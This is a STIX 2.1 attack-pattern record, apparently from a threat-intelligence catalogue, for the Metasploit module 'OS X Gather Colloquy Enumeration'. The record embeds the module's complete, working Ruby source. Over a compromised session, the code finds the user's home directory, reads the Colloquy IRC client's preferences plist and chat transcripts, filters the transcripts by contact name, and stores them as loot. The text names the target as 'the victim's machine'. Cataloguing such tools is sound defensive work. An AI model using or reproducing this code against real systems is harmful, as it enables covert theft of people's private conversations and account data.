{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--39932067-e10d-4109-8799-c7967ef87153",
    "created": "2024-08-14T16:33:00.700623Z",
    "modified": "2024-08-14T16:33:00.700628Z",
    "name": "OS X Gather Colloquy Enumeration",
    "description": " This module will collect Colloquy's info plist file and chat logs from the victim's machine.  There are three actions you may choose:  INFO, CHATS, and ALL.  Please note that the CHAT action may take a long time depending on the victim machine, therefore we suggest to set the regex 'PATTERN' option in order to search for certain log names (which consists of the contact's name, and a timestamp).  The default 'PATTERN' is configured as \"^alien\" as an example to search for any chat logs associated with the name \"alien\".  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/osx/gather/enum_colloquy.rb",
            "external_id": "enum_colloquy.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'OS X Gather Colloquy Enumeration',\n        'Description' => %q{\n          This module will collect Colloquy's info plist file and chat logs from the\n          victim's machine.  There are three actions you may choose:  INFO, CHATS, and\n          ALL.  Please note that the CHAT action may take a long time depending on the\n          victim machine, therefore we suggest to set the regex 'PATTERN' option in order\n          to search for certain log names (which consists of the contact's name, and a\n          timestamp).  The default 'PATTERN' is configured as \"^alien\" as an example\n          to search for any chat logs associated with the name \"alien\".\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'sinn3r'],\n        'Platform' => [ 'osx' ],\n        'SessionTypes' => [ 'meterpreter', 'shell' ],\n        'Actions' => [\n          ['ACCOUNTS', { 'Description' => 'Collect the preferences plists' } ],\n          ['CHATS', { 'Description' => 'Collect chat logs with a pattern' } ],\n          ['ALL', { 'Description' => 'Collect both the plists and chat logs' }]\n        ],\n        'DefaultAction' => 'ALL'\n      )\n    )\n\n    register_options(\n      [\n        OptRegexp.new('PATTERN', [true, 'Match a keyword in any chat log\\'s filename', '^alien']),\n      ]\n    )\n  end\n\n  #\n  # Parse a plst file to XML format:\n  # http://hints.macworld.com/article.php?story=20050430105126392\n  #\n  def plutil(filename)\n    exec(\"plutil -convert xml1 #{filename}\")\n    data = exec(\"cat #{filename}\")\n    return data\n  end\n\n  def get_chatlogs(base)\n    chats = []\n\n    # Get all the logs\n    print_status(\"#{@peer} - Download logs...\")\n    folders = dir(\"\\\"#{base}\\\"\")\n    folders.each do |f|\n      # Get all the transcripts from this folder\n      trans = exec(\"find \\\"#{base}#{f}\\\" -name *.colloquyTranscript\")\n      trans.split(\"\\n\").each do |t|\n        fname = ::File.basename(t)\n        # Check fname before downloading it\n        next if fname !~ datastore['PATTERN']\n\n        print_status(\"#{@peer} - Downloading #{t}\")\n        content = exec(\"cat \\\"#{t}\\\"\")\n        chats << { log_name: fname, content: content }\n      end\n    end\n\n    return chats\n  end\n\n  def get_preferences(path)\n    raw_plist = exec(\"cat #{path}\")\n    return nil if raw_plist =~ /No such file or directory/\n\n    xml_plist = plutil(path)\n    return xml_plist\n  end\n\n  def save(type, data)\n    case type\n    when :preferences\n      p = store_loot(\n        'colloquy.preferences',\n        'text/plain',\n        session,\n        data,\n        'info.colloquy.plist'\n      )\n      print_good(\"#{@peer} - info.colloquy.plist saved as: #{p}\")\n\n    when :chatlogs\n      data.each do |d|\n        log_name = d[:log_name]\n        content = d[:content]\n\n        p = store_loot(\n          'colloquy.chatlogs',\n          'text/plain',\n          session,\n          content,\n          log_name\n        )\n        print_good(\"#{@peer} - #{log_name} stored in #{p}\")\n      end\n    end\n  end\n\n  def whoami\n    exec('/usr/bin/whoami')\n  end\n\n  def dir(path)\n    subdirs = exec(\"ls -l #{path}\")\n    return [] if subdirs =~ /No such file or directory/\n\n    items = subdirs.scan(/[A-Z][a-z][a-z]\\x20+\\d+\\x20[\\d:]+\\x20(.+)$/).flatten\n    return items\n  end\n\n  def exec(cmd)\n    tries = 0\n    begin\n      out = cmd_exec(cmd).chomp\n    rescue ::Timeout::Error => e\n      tries += 1\n      if tries < 3\n        vprint_error(\"#{@peer} - #{e.message} - retrying...\")\n        retry\n      end\n    rescue EOFError => e\n      tries += 1\n      if tries < 3\n        vprint_error(\"#{@peer} - #{e.message} - retrying...\")\n        retry\n      end\n    end\n  end\n\n  def run\n    if action.nil?\n      print_error('Please specify an action')\n      return\n    end\n\n    @peer = \"#{session.session_host}:#{session.session_port}\"\n    user = whoami\n\n    transcripts_path = \"/Users/#{user}/Documents/Colloquy Transcripts/\"\n    prefs_path = \"/Users/#{user}/Library/Preferences/info.colloquy.plist\"\n\n    prefs = get_preferences(prefs_path) if action.name =~ /ALL|ACCOUNTS/i\n    chatlogs = get_chatlogs(transcripts_path) if action.name =~ /ALL|CHATS/i\n\n    save(:preferences, prefs) if !prefs.nil? && !prefs.empty?\n    save(:chatlogs, chatlogs) if !chatlogs.nil? && !chatlogs.empty?\n  end\nend\n\n=begin\n/Users/[user]/Documents/Colloquy Transcripts\n/Users/[user]/Library/Preferences/info.colloquy.plist\n\nTranscript example:\n/Users/[username]/Documents/Colloquy Transcripts//[server]/[contact] 10-13-11.colloquyTranscript\n=end\n",
    "x_mitre_platforms": [
        "[ 'osx' ]"
    ]
}